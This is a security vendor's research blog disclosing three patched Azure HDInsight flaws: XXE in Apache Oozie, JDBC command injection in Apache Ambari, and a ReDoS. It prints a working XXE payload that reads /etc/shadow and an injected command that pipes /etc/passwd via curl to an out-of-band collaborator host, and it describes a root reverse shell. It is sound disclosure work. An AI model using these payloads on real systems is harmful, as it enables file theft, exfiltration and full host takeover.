---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-02-06_azure-hdinsight-the-sequel-unveiling-3-new-vulnerabilities-that-could-have-led-t.md
original_filename: 2024-02-06_azure-hdinsight-the-sequel-unveiling-3-new-vulnerabilities-that-could-have-led-t.md
title: 'Azure HDInsight: The Sequel – Unveiling 3 New Vulnerabilities That Could Have
  Led to Privilege Escalations and Denial of Service'
category: documents
detected_topics:
- cloud-security
- sso
- idor
- access-control
- ssrf
- xss
tags:
- imported
- documents
- cloud-security
- sso
- idor
- access-control
- ssrf
- xss
language: en
raw_sha256: 035404177162c0f7e433956a969c721bfc7ea63c88f5591b83ffcb00a8ffa41e
text_sha256: 1492a31d136f6126fc50396401fdb79d2892cd08f970ce592ea8a8a53654cd2e
ingested_at: '2026-06-28T07:32:31Z'
sensitivity: unknown
redactions_applied: false
---

# Azure HDInsight: The Sequel – Unveiling 3 New Vulnerabilities That Could Have Led to Privilege Escalations and Denial of Service

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-02-06_azure-hdinsight-the-sequel-unveiling-3-new-vulnerabilities-that-could-have-led-t.md
- Source Type: markdown
- Detected Topics: cloud-security, sso, idor, access-control, ssrf, xss
- Ingested At: 2026-06-28T07:32:31Z
- Redactions Applied: False
- Raw SHA256: `035404177162c0f7e433956a969c721bfc7ea63c88f5591b83ffcb00a8ffa41e`
- Text SHA256: `1492a31d136f6126fc50396401fdb79d2892cd08f970ce592ea8a8a53654cd2e`


## Content

---
title: "Azure HDInsight: The Sequel – Unveiling 3 New Vulnerabilities That Could Have Led to Privilege Escalations and Denial of Service"
page_title: "Azure HDInsight Privilege Escalation and Denial of Service Vulnerabilities | Orca Security"
url: "https://orca.security/resources/blog/azure-hd-insight-vulnerabilities-privilege-escalation/"
final_url: "https://orca.security/resources/blog/azure-hd-insight-vulnerabilities-privilege-escalation/"
authors: ["Lidor Ben Shitrit"]
programs: ["Microsoft (Azure HDInsight)"]
bugs: ["XXE", "Privilege escalation", "ReDoS", "Security code review"]
publication_date: "2024-02-06"
added_date: "2024-02-27"
source: "pentester.land/writeups.json"
original_index: 449
---

[ Blog Home](https://orca.security/resources/blog/)

  * [ Research Pod ](https://orca.security/resources/category/research-pod/)

![Azure HDInsight: The Sequel – Unveiling 3 New Vulnerabilities That Could Have Led to Privilege Escalations and Denial of Service](https://orca.security/wp-content/uploads/2023/12/Blog_Azure-HDInsights-Sequel_Cover.jpg?w=1044)

# Azure HDInsight: The Sequel – Unveiling 3 New Vulnerabilities That Could Have Led to Privilege Escalations and Denial of Service

[ ![Avatar of Lidor Ben Shitrit](https://orca.security/wp-content/uploads/2022/01/avatar-lidor-ben.png) Lidor Ben Shitrit  ](https://orca.security/resources/author/lidor-ben-shitrit/)

Published: Feb 06, 2024 

  * [ __](https://twitter.com/share?text=Azure%20HDInsight%3A%20The%20Sequel%20%26%238211%3B%20Unveiling%203%20New%20Vulnerabilities%20That%20Could%20Have%20Led%20to%20Privilege%20Escalations%20and%20Denial%20of%20Service&url=https%3A%2F%2Forca.security%2Fresources%2Fblog%2Fazure-hd-insight-vulnerabilities-privilege-escalation%2F)
  * [ __](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Forca.security%2Fresources%2Fblog%2Fazure-hd-insight-vulnerabilities-privilege-escalation%2F)
  * [ __](https://www.facebook.com/sharer.php?u=https%3A%2F%2Forca.security%2Fresources%2Fblog%2Fazure-hd-insight-vulnerabilities-privilege-escalation%2F)
  * [ __](mailto:?Subject=Azure HDInsight: The Sequel – Unveiling 3 New Vulnerabilities That Could Have Led to Privilege Escalations and Denial of Service&body=https%3A%2F%2Forca.security%2Fresources%2Fblog%2Fazure-hd-insight-vulnerabilities-privilege-escalation%2F)

Orca has discovered three new vulnerabilities within various Azure HDInsight third-party services, including Apache Hadoop, Spark, and Kafka. These services are integral components of Azure HDInsight, a widely used managed service offered within the Azure ecosystem. 

Two of the vulnerabilities could have led to Privilege Escalation (PE) and one could have been used to cause a Regex Denial of Service (ReDoS). These discoveries come in quick succession after our previous finding of [8 XSS vulnerabilities in Azure HDInsight](https://orca.security/resources/blog/cross-site-scripting-vulnerabilities-in-apache-services-azure-hd-insight/).

We immediately informed the Microsoft Service Response Center (MSRC), who assigned a CVE to two of the vulnerabilities and promptly fixed all three issues in their [October 26th security update](https://learn.microsoft.com/en-us/azure/hdinsight/hdinsight-release-notes). In this blog, we’ll describe in detail how we discovered the vulnerabilities and who this could have affected.

## Executive Summary:

  * Orca discovered three important vulnerabilities within various Azure HDInsight third-party services, including Apache Hadoop, Spark, and Kafka. Two are Privilege Escalation (PE) vulnerabilities and one is a Regex Denial of Service (ReDoS) vulnerability.
  * These findings are in addition to our discovery of [8 XSS vulnerabilities in Azure HDInsight](https://orca.security/resources/blog/cross-site-scripting-vulnerabilities-in-apache-services-azure-hd-insight/), published on September 13, 2023.
  * The new vulnerabilities affect any authenticated user of Azure HDInsight services such as Apache Ambari and Apache Oozie.
  * The two PE vulnerabilities on Apache Ambari and Apache Oozie allowed an authenticated attacker with HDI cluster access to send a network request and gain cluster administrator privileges – allowing them to read, write, delete and perform all resource service management operations.
  * The ReDoS vulnerability on Apache Oozie was caused by a lack of proper input validation and constraint enforcement, and allowed an attacker to request a large range of action IDs and cause an intensive loop operation, leading to a Denial of Service (DoS). This would disrupt operations, cause degradation of performance, and negatively impact both the availability and reliability of the Oozie system, including its dashboard, hosts, and jobs.
  * Upon discovering these vulnerabilities, we leveraged our strong relationship with Microsoft MSRC team to report them promptly. The team immediately prioritized these cases, and Orca assisted the MSRC team in reproducing and fixing the issues in various phone calls.
  * All issues have been resolved by Microsoft. Users will need to update their HDInsight instances with the latest [Microsoft security patch](https://learn.microsoft.com/en-us/azure/hdinsight/hdinsight-release-notes) to be protected. 

## About the 3 Vulnerabilities in Azure HDInsight

Below we have included an overview of the three new vulnerabilities that we found in Azure HDInsight. To protect against these vulnerabilities, organizations must apply Microsoft’s security update as specified below. However, HDInsight doesn’t support in-place upgrades so users must create a new cluster with the desired component and latest platform version that includes the security updates. Next, they should migrate their applications to use the new cluster. See [Azure HDInsight upgrade instructions](https://learn.microsoft.com/en-us/azure/hdinsight/hdinsight-upgrade-cluster) for further information.

| **Name**| **Severity**| **Type**| **Impact**| **CVE**| **Patch**  
---|---|---|---|---|---|---  
#1| Azure HDInsight Apache Oozie Workflow Scheduler XXE Elevation of Privileges Vulnerability| CVSS 8.8| XML external entity injection (XXE)| Local file read, Privilege Escalation (PE)| [CVE-2023-36419](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36419?cve=title)| [October 26th Security Update](https://learn.microsoft.com/en-us/azure/hdinsight/hdinsight-release-notes)  
#2| Azure HDInsight Apache Ambari JDBC Injection Elevation of Privileges Vulnerability| CVSS 7.2| Privilege Escalation (PE)| Privilege Escalation (PE)| [CVE-2023-38156](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-38156)| [October 26th Security Update](https://learn.microsoft.com/en-us/azure/hdinsight/hdinsight-release-notes)  
#3| Azure HDInsight Apache Oozie Regex Denial Of Service via vulnerable parameter| Moderate| reDoS| Denial Of Service| | [October 26th Security Update](https://learn.microsoft.com/en-us/azure/hdinsight/hdinsight-release-notes)  
  
## What is Azure HDInsight?

Azure HDInsight is a fully managed, open-source analytics service provided by Microsoft to efficiently process large-scale big data workloads in a scalable and flexible manner. It operates as a cloud-based service that streamlines the management, processing, and analysis of big data by offering a range of data processing frameworks, such as Apache Hadoop, Apache Spark, Apache Kafka, and more.

For more background and specific details on Azure HDInsight, as well as eight other XSS vulnerabilities we found in the service, please read our previous blog post ‘[Azure HDInsight Riddled With XSS Vulnerabilities via Apache Services](https://orca.security/resources/blog/cross-site-scripting-vulnerabilities-in-apache-services-azure-hd-insight/).’

### Case #1: Azure HDInsight Apache Oozie Workflow Scheduler XXE Elevation of Privileges

Apache Oozie is a workflow scheduler for Hadoop that allows users to define and link together a series of big data processing tasks. It coordinates and schedules these tasks, executing them in a specified order or at specific times. It integrates with the Hadoop ecosystem, providing a system for automated, complex data processing workflows.

**Vulnerability Description**

We found that Azure HDInsight / Apache Oozie Workflow Scheduler had a vulnerability that allowed for root-level file reading and privilege escalation from low-privilege users. The vulnerability was caused through lack of proper user input validation.

This vulnerability is known as an XML External Entity (XXE) injection attack. Attackers can exploit XXE vulnerabilities to read arbitrary files on the server, including sensitive system files. They can also use this vulnerability to escalate privileges.

**Attack Workflow**

We’ll start by creating the service, this time we’ll create a `Spark Cluster`.

After creating the service, we navigate as an **Admin** to the Apache Ambari Management Dashboard and create a Low Privilege user for this POC.

![](https://orca.security/wp-content/uploads/2024/01/image-155.png?w=781)

Next navigate to Users and create a new User called “low” with a Cluster User Role (this is the lowest level in Apache Ambari) – Next, we create the Workflow Service by navigating to **Views,** and create it with default parameters.

![](https://orca.security/wp-content/uploads/2024/01/image-156.png?w=810)

After creating the service, go to **Views** and click on the Pencil icon to edit the endpoint so the low user can reach it as well. Next, we grant permission to the Low Privilege User –

![](https://orca.security/wp-content/uploads/2024/01/image-406.png?w=772)

In order to enter the service itself, we need to assign it with a URL suffix –

![](https://orca.security/wp-content/uploads/2024/01/image-407.png?w=1200)

Assigning a random name such as `workflowservice` –

![](https://orca.security/wp-content/uploads/2024/01/image-408.png?w=1200)

Now we can see that our “**`low`** ” user is listed on View Permissions and we are good to go. I will log out from the **`Admin`** user and sign in again as the **“`low`”** user, and enter the Workflow Service Dashboard –

![](https://orca.security/wp-content/uploads/2024/01/image-409.png?w=1200)

Behind the scenes we can validate that indeed our user is the one who is using the service. We can do so by checking the base64 Low user credentials –

![](https://orca.security/wp-content/uploads/2024/01/image-410.png)

Among the various requests that are being sent, we can see that `getcurrentUserName` returns ‘low’, which verifies that we are currently operating and sending requests in the context of the low privileges user –

![](https://orca.security/wp-content/uploads/2024/01/image-411.png)

**Before jumping in, let’s explain more about the architecture of the Workflow –**

So as we can see from the following screenshot, when creating various services/components, the user is able to save/upload files using the dashboard, but the user is limited to only a certain type of folders.

For example, the following screen is showing a GET request that is being made by the user, when they navigate through the various folders in the Dashboard itself.

For instance, when a user creates a new **Workflow,** the following request is being sent –

https://research-insight.azurehdinsight.net/api/v1/views/WORKFLOW_MANAGER/versions/1.0.0/instances/workflowservice/resources/proxy/readWorkflowXml?workflowXmlPath=

We can play with it a bit to see whether this **`workflowXmlPath`** query string is vulnerable to any type of SSRF/LFI etc. Although it is not vulnerable, we can still check whether certain files exist in the OS, for example **`/etc/paswd`**.

![](https://orca.security/wp-content/uploads/2024/01/image-412.png)

We can see that the **`passwd`** file does not exist –

![](https://orca.security/wp-content/uploads/2024/01/image-413.png)

What about the **`etc`** folder then?

![](https://orca.security/wp-content/uploads/2024/01/image-414.png)

It seems that the **`/etc/`** folder does exist, but no **`passwd`** file.

**Back to the workflow**

In order to examine the functionality of the dashboard, we’ve landed in the Coordinator component. We’ll create a new Coordinator by clicking on Create and Coordinator and then give it a name, and choose a non existing file/folder. Next we’ll set the Start and End Time –

![](https://orca.security/wp-content/uploads/2024/01/image-415.png?w=1032)

Once done, we hit **Save**.

Again, we choose a random location and hit Save –

![](https://orca.security/wp-content/uploads/2024/01/image-416.png?w=1200)

After saving the **`Coordinator`** , click Submit in order to send the **`Coordinator`** Job to the server. We can see that indeed our Coordinator was saved and scheduled –

![](https://orca.security/wp-content/uploads/2024/01/image-417.png?w=1073)

After we configured the Job, we check the requests that are being made, **especially the last request to Submit the Job –**

We can see that the Job is being sent as an XML payload, without a desired name and location –

![](https://orca.security/wp-content/uploads/2024/01/image-418.png?w=1200)

After sending the body, a new Job ID is created, but we’re not interested in that.

Let’s modify the request Body a bit –

(In order to avoid creating a new Job, you can change the path to something random such as **`/tmp/doesnotexist`** and the **`overwrite`** query string to **true**.)

![](https://orca.security/wp-content/uploads/2024/01/image-419.png?w=918)

We can see that by changing the body to a generic XXE payload, we can have a NullPointerException**.**

We send a malformed XML payload –

![](https://orca.security/wp-content/uploads/2024/01/image-420.png?w=1200)

That’s better. We got a Parser exception, specifically – **SAXParseException**.

**Root Cause Analysis**

With further inspection on the specific method (**submitJob**) we can see that the body is being sent to `formatXML` –

![](https://orca.security/wp-content/uploads/2024/01/image-421.png)

From the Stack Trace, reviewing the Utils.java file we can see our previous exception (**SAXParseException)** –

![](https://orca.security/wp-content/uploads/2024/01/image-422.png?w=1200) ![](https://orca.security/wp-content/uploads/2024/01/image-423.png?w=1113)

Examining the specific exception, it seems that it could be vulnerable to XXE but we need to verify it first.

**Almost there**

After a few good trials and errors, we managed to get an Out-of-Bounds (OOB) by providing the following payload to be sent to the server –

![](https://orca.security/wp-content/uploads/2024/01/image-424.png?w=1200)

Great, we can see in the following screenshot that the request was made, meaning that we are getting closer –

![](https://orca.security/wp-content/uploads/2024/01/image-425.png)

Let’s try grabbing the **`/etc/passwd`** file –

![](https://orca.security/wp-content/uploads/2024/01/image-426.png)

We can see it failed, BUT we also know that the file is there due the systemId and the markup error –

![](https://orca.security/wp-content/uploads/2024/01/image-427.png)

**DTD FTW**

We’ll change the payload and use an external DTD file that will be hosted on my remote host by setting up the following –

  1. A remote DTD that will assign the `/etc/passwd` to the “`file`” variable and later send its content via the `<!ENTITY>`.
  2. Ngrok server that will host the DTD file.

![](https://orca.security/wp-content/uploads/2024/01/image-428.png?w=1200)

Sending the request –

![](https://orca.security/wp-content/uploads/2024/01/image-429.png?w=1200)

We got its content, but what about root level file access?

Sending the 2nd request for **`/etc/shadow`** –

![](https://orca.security/wp-content/uploads/2024/01/image-430.png?w=1200)

Now we accomplished a full root level file reading.

A non-DTD payload that we managed to find working –
  
  
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % constant 'aaa)>
  <!ENTITY % file SYSTEM "file:///etc/shadow">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///%file;'>">
  %eval;
  %error;
  <!ELEMENT aa (bb'>
  %local_dtd;
  ]>
  <message>Text</message>
  

Let’s see what else we can find to elevate our privileges –

`/etc/ambari-server/conf/ambari.properties` – Containing all JDBC connection strings to the cluster DB, including passwords, username etc.

![](https://orca.security/wp-content/uploads/2024/01/image-431.png?w=1200)

Among these are the certificates files for the cluster –

![](https://orca.security/wp-content/uploads/2024/01/image-432.png?w=1200)

**Potential Impact of the Vulnerability**

XML External Entity (XXE) Processing, Local file read, Privilege Escalation

### Case #2: Azure HDInsight Apache Ambari JDBC Injection Elevation of Privileges

Apache Ambari is an open-source tool for simplifying the deployment, management, and monitoring of Hadoop clusters. In the context of Azure, it streamlines Hadoop cluster setup, management, configuration, and monitoring. It also enables easy scaling, security implementation, and integration with Azure services, enhancing the big data solution on Azure.

**User and Roles type in Apache Ambari**

Following the documentation here –

<https://docs.cloudera.com/HDPDocuments/Ambari-latest/administering-ambari/content/amb_understanding_cluster_roles.html>

Access levels allow administrators to categorize cluster users and groups based on the permissions that each level includes.

**`Ambari Administrator`** : Ambari Administrator users have full control over all aspects of Ambari. This includes the ability to create clusters, change cluster names, register new versions of cluster software, and fully control all clusters managed by the Ambari instance.

These roles enable fine-grained control over cluster operations and access permissions, catering to different user needs.

When creating new HDInsight Cluster of any kind, there are two users that are created as **Ambari Administrator:**

  1. admin
  2. hdinsightwatchdog

As described above, the admin has full capability over the Cluster and can add and delete resources/service/users/groups etc. for this demonstration we’ll set up a new low privilege user called **LowPrivUser** which only has the **`Cluster User`** role.

**POC Workflow**

We start by creating a new HDInsight Cluster – Hadoop –

![](https://orca.security/wp-content/uploads/2024/01/image-433.png?w=1200)

Next as admin, we’ll navigate to **Manage Ambari** , and from there to **Users** –

We create a new `lowprivuser` and assign it as **Cluster Operator** –

![](https://orca.security/wp-content/uploads/2024/01/image-448.png?w=940)

We can see that we are missing relevant Admin Capabilities –

![](https://orca.security/wp-content/uploads/2024/01/image-449.png)

Next we navigate to **`Hive`** , and Under `Configs` click on `Database` –

![](https://orca.security/wp-content/uploads/2024/01/image-450.png?w=876)

From the screenshot below we can see that we have the ability to test for the Hive Database configurations by clicking on **TEST CONNECTION –**

![](https://orca.security/wp-content/uploads/2024/01/image-451.png)

After clicking Test Connection, we can review the request in Burp –

![](https://orca.security/wp-content/uploads/2024/01/image-452.png?w=1200)

The request action is called `check_host` and is specifically allowed for certain type of users in the Cluster, among them the `Cluster Operator`.

Following various research in regards to JDBC, we figured we should at least try and change the different variables in the Cluster dashboard and observed the strerr and stdout –

![](https://orca.security/wp-content/uploads/2024/01/image-453.png?w=1026)

Let’s try and manipulate the JDBC url endpoint by adding the following –

“db_connection_url”:”jdbc:sqlserver://research-orca.database.windows.net;database=research;encrypt=true;trustServerCertificate=true;create=false;loginTimeout=300;`$(cat /etc/passwd | curl --data-binary @- -m 5 <http://l7t5293jxrhivs5s1c0301y7zy5ptmhb.oastify.com> | echo 1)`“

![](https://orca.security/wp-content/uploads/2024/01/image-454.png?w=1200)

Checking the collaborator –

![](https://orca.security/wp-content/uploads/2024/01/image-455.png?w=994)

Next we send a reverse shell payload –

![](https://orca.security/wp-content/uploads/2024/01/image-456.png?w=1200)

Got a reverse shell as root –

![](https://orca.security/wp-content/uploads/2024/01/image-457.png?w=1200)

**Potential Impact of the Vulnerability**

A Cluster Operator can manipulate the request by adding a malicious code injection and gain a root over the cluster main host.

### Case #3: Azure HDInsight Apache Oozie Regex Denial Of Service via vulnerable parameter

As mentioned in Case #1, Apache Oozie is a workflow scheduler for Hadoop that allows users to define and link together a series of big data processing tasks. It coordinates and schedules these tasks, executing them in a specified order or at specific times. It integrates with the Hadoop ecosystem, providing a system for automated, complex data processing workflows.

**Vulnerability Description**

The code provided allows a user to request logs for a specific job by specifying a range of actions. Due to the lack of proper input validation and constraint enforcement, an attacker can request a large range of action IDs. This causes an intensive loop operation within the system, leading to a Denial of Service (DoS) vulnerability.

**Root Cause Analysis**

<https://github1s.com/apache/oozie/blob/HEAD/core/src/main/java/org/apache/oozie/CoordinatorEngine.java#L372>

![](https://orca.security/wp-content/uploads/2024/01/image-458.png?w=940)

**Effects**

  1. **Oozie Dashboard** : The DoS attack could slow down or completely halt the Oozie dashboard, making it unresponsive. The dashboard might become inaccessible for legitimate users as the server is consumed with processing the malicious request(s).
  2. **Oozie Hosts** : The affected hosts running the Oozie service may experience increased CPU and memory utilization. This can lead to performance degradation across other services on the host, affecting overall system stability.
  3. **Oozie Jobs** : The heavy processing induced by the malicious request can impede the system’s ability to schedule and manage other Oozie jobs. It may lead to delays, failures, or incorrect scheduling, affecting the timely execution and reliability of workflows and data processing tasks within the Oozie framework.

Overall, this vulnerability has the potential to disrupt normal operations, cause degradation of performance, and negatively impact both the availability and reliability of the Oozie system, including its dashboard, hosts, and jobs.

**POC Workflow**

We start by creating the service, this time a `Hadoop Cluster`.

After creating the service, we navigate as an **Admin** to the Apache Ambari Management Dashboard and create a Low Privilege user for this POC. Next we navigate to Users.

We create a new User called “low” with a Cluster User Role (this is the lowest low in Apache Ambari) –

![](https://orca.security/wp-content/uploads/2024/01/image-459.png?w=1200)

Next, we create the Workflow Service by navigating to **Views** and creating it with default parameters.

After creating the service, navigate to **Views** and edit the endpoint so the `low` user can reach it as well.

![](https://orca.security/wp-content/uploads/2024/01/image-460.png?w=1200)

In order to enter the service itself, we need to assign it with a URL suffix. Click on Create New URL and assign a random name such as `workflowservice` –

![](https://orca.security/wp-content/uploads/2024/01/image-461.png?w=1200)

Now, we log out from the **`Admin`** user and sign in again as the **`low`** user, and enter the Workflow Service Dashboard –

![](https://orca.security/wp-content/uploads/2024/01/image-462.png?w=1200)

Behind the scenes we can validate that indeed our user is the one who is using the service. we can do so by checking the base64 Low user credentials –

![](https://orca.security/wp-content/uploads/2024/01/image-463.png)

Let’s enter the Workspace dashboard and create a new `Bundle/Workflow/Coordinator` job –

![](https://orca.security/wp-content/uploads/2024/01/image-464.png?w=1139) ![](https://orca.security/wp-content/uploads/2024/01/image-465.png?w=1118)

The request itself is a simple `PUT` request that aims to disable the SLA action.

![](https://orca.security/wp-content/uploads/2024/01/image-466.png?w=1200) ![](https://orca.security/wp-content/uploads/2024/01/image-467.png?w=973) ![](https://orca.security/wp-content/uploads/2024/01/image-468.png?w=1117)

The building of **`orSeparatedActions`** uses string concatenation with OR | and brackets, possibly leading to a complex Regular Expression Denial of Service. If many action IDs are provided, especially in a large range, this can lead to a highly complex expression with many OR conditions.

![](https://orca.security/wp-content/uploads/2024/01/image-469.png?w=1198)

Watch the video to see the full POC workflow:

![](https://fast.wistia.com/embed/medias/ghms147sad/swatch)

## About the Orca Research Pod

The [Orca Research Pod](https://orca.security/about/orca-research-pod/) discovers and analyzes cloud risks and vulnerabilities to strengthen the Orca platform and promote cloud security best practices. Orca’s expert security research team has discovered several critical vulnerabilities in public cloud provider platforms, and continues to investigate different cloud products and services to find zero-day vulnerabilities before any malicious actors do. So far, Orca has discovered 20+ major vulnerabilities in Azure, AWS, and Google Cloud, and worked with cloud and service providers to resolve them.

## About Orca Security

Orca’s agentless [cloud security platform](https://orca.security/platform/) connects to your environment in minutes and provides full visibility of all your assets on AWS, Azure, Google Cloud, Kubernetes, and more. Orca detects, prioritizes, and helps remediate cloud risks across every layer of your cloud estate, including vulnerabilities, malware, misconfigurations, lateral movement risk, API risks, sensitive data at risk, weak and leaked passwords, and overly permissive identities.

  * [ __](https://twitter.com/share?text=Azure%20HDInsight%3A%20The%20Sequel%20%26%238211%3B%20Unveiling%203%20New%20Vulnerabilities%20That%20Could%20Have%20Led%20to%20Privilege%20Escalations%20and%20Denial%20of%20Service&url=https%3A%2F%2Forca.security%2Fresources%2Fblog%2Fazure-hd-insight-vulnerabilities-privilege-escalation%2F)
  * [ __](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Forca.security%2Fresources%2Fblog%2Fazure-hd-insight-vulnerabilities-privilege-escalation%2F)
  * [ __](https://www.facebook.com/sharer.php?u=https%3A%2F%2Forca.security%2Fresources%2Fblog%2Fazure-hd-insight-vulnerabilities-privilege-escalation%2F)
  * [ __](mailto:?Subject=Azure HDInsight: The Sequel – Unveiling 3 New Vulnerabilities That Could Have Led to Privilege Escalations and Denial of Service&body=https%3A%2F%2Forca.security%2Fresources%2Fblog%2Fazure-hd-insight-vulnerabilities-privilege-escalation%2F)

## Related articles

[ ![Risk-based Vulnerability Management](https://orca.security/wp-content/uploads/2025/02/orca-blog-risk-prioritization-featured.png?w=750) ](/resources/blog/risk-based-vulnerability-management/)

![](https://orca.security/wp-content/themes/orca-2023/assets/svg/featured-blue.svg) ![](https://orca.security/wp-content/themes/orca-2023/assets/svg/featured-white.svg)

Product Info

##  [Risk-Based Vulnerability Management for the Cloud: A 2026 Guide](/resources/blog/risk-based-vulnerability-management/ "Risk-Based Vulnerability Management for the Cloud: A 2026 Guide")

Jun 26, 2026 

[ ![Digital illustration of a data center cross-section showing an adversarial path indicated by glowing red arrows originating from a breached, orange-lit server rack and moving laterally toward a secured, cyan-lit server enclosure with a locked terminal.](https://orca.security/wp-content/uploads/2026/06/orca-blog-private-cloud-security-1.png?w=750) ](/resources/blog/private-cloud-security/)

![](https://orca.security/wp-content/themes/orca-2023/assets/svg/featured-blue.svg) ![](https://orca.security/wp-content/themes/orca-2023/assets/svg/featured-white.svg)

Cloud Security Learning

##  [Private Cloud Security: Top Risks and Best Practices (2026)](/resources/blog/private-cloud-security/ "Private Cloud Security: Top Risks and Best Practices \(2026\)")

Jun 26, 2026 

[ ![Digital illustration of a central AI microchip on a cloudy background, processing threats from the left—such as a cracked message bubble and a bug icon—and outputting cybersecurity solutions on the right, including prioritized alert windows and a remediation code terminal.](https://orca.security/wp-content/uploads/2026/06/orca-blog-what-is-generative-ai-in-cybersecurity-1.png?w=750) ](/resources/blog/what-is-generative-ai-in-cybersecurity/)

![](https://orca.security/wp-content/themes/orca-2023/assets/svg/featured-blue.svg) ![](https://orca.security/wp-content/themes/orca-2023/assets/svg/featured-white.svg)

Cloud Security Learning

##  [What Is Generative AI in Cybersecurity?](/resources/blog/what-is-generative-ai-in-cybersecurity/ "What Is Generative AI in Cybersecurity?")

Jun 25, 2026 

### Stay in the loop

Keep up to date with everything you need to know about cloud security and our latest research

By submitting my email address I agree to the use of my personal data in accordance with Orca Security [ Privacy Policy](https://orca.security/privacy-policy/).
